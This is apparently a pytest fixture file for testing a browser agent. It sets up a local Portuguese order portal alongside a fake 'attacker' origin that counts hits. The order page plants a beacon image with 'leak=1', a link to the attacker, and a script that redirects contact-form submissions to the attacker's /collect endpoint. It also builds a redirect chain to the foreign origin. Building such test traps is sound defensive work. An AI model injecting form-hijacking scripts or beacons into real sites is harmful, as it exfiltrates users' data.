"""Test site: a portal plus a separate attacker origin, both counting what they receive."""

import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs

import pytest
from playwright.async_api import async_playwright

PASSWORD = "s3nha-de-teste"  # noqa: S105  # test fixture


class Site:
    def __init__(self):
        self.logins, self.cancelled, self.contact, self.searches = 0, 0, [], 0
        self.attacker_hits: list[str] = []
        self.attacker = self._serve(self._attacker_handler())
        self.portal = self._serve(self._portal_handler())
        self.attacker_url = f"http://127.0.0.1:{self.attacker.server_port}"
        self.portal_url = f"http://127.0.0.1:{self.portal.server_port}"

    def _serve(self, handler):
        srv = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        return srv

    def _attacker_handler(self):
        site = self

        class H(BaseHTTPRequestHandler):
            def _hit(self):
                site.attacker_hits.append(f"{self.command} {self.path}")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            do_GET = do_POST = _hit  # noqa: N815

            def log_message(self, *_):
                pass

        return H

    def _portal_handler(self):
        site = self

        class H(BaseHTTPRequestHandler):
            def _page(self, body, status=200, headers=()):
                self.send_response(status)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                for k, v in headers:
                    self.send_header(k, v)
                self.end_headers()
                self.wfile.write(body.encode())

            def do_GET(self):  # noqa: N802
                path = self.path.split("?")[0]
                if path == "/login":
                    return self._page(
                        "<h1>Login</h1><form method=post action=/login>"
                        "<input name=user><input name=password type=password>"
                        "<button>Entrar</button></form>"
                    )
                if "session=ok" not in self.headers.get("Cookie", ""):
                    return self._page("", 303, [("Location", "/login")])
                if path == "/orders":
                    return self._page("<h1>Pedidos</h1><a href='/orders/1'>Pedido 1</a>")
                if path == "/hop":  # allowed -> allowed -> foreign
                    return self._page("", 302, [("Location", "/go")])
                if path == "/go":  # an allowed origin redirecting to a foreign one
                    return self._page(
                        "", 302, [("Location", f"{site.attacker_url}/beacon?redirect=1")]
                    )
                if path == "/search":
                    site.searches += 1
                    return self._page("<h1>Resultado da busca</h1>")
                if path == "/orders/1":
                    a = site.attacker_url
                    return self._page(
                        "<h1>Pedido 1</h1><p>Status: Enviado</p>"
                        f"<img src='{a}/beacon?leak=1'>"
                        f"<a href='{a}/verify'>Verificar</a>"
                        "<form method=post action=/cancel><button>Cancelar pedido</button></form>"
                        "<form id=f method=post action=/contact><input name=msg>"
                        "<button>Enviar</button></form>"
                        f"<script>f.addEventListener('submit', e => e.target.action='{a}/collect')"
                        "</script>"
                        "<form method=get action=/search><input name=q>"
                        "<button>Buscar</button></form>"
                        "<input type=password name=pw2>"
                    )
                self._page("nope", 404)

            def do_POST(self):  # noqa: N802
                n = int(self.headers.get("Content-Length", 0))
                raw = self.rfile.read(n).decode()
                path = self.path.split("?")[0]
                if path == "/login" and parse_qs(raw).get("password") == [PASSWORD]:
                    site.logins += 1
                    return self._page(
                        "", 303, [("Location", "/orders"), ("Set-Cookie", "session=ok; Path=/")]
                    )
                if path == "/cancel":
                    site.cancelled += 1
                if path == "/contact":
                    site.contact.append(raw)
                self._page("done")

            def log_message(self, *_):
                pass

        return H


@pytest.fixture
def site():
    s = Site()
    yield s
    s.portal.shutdown()
    s.attacker.shutdown()


@pytest.fixture(scope="session")
def browser_available():
    async def probe():
        import os

        exe = os.environ.get("OMOTAI_BROWSER")
        async with async_playwright() as pw:
            b = await pw.chromium.launch(**({"executable_path": exe} if exe else {}))
            await b.close()

    try:
        asyncio.run(probe())
    except Exception as e:  # noqa: BLE001
        pytest.skip(f"no Chromium available for Playwright: {type(e).__name__}")
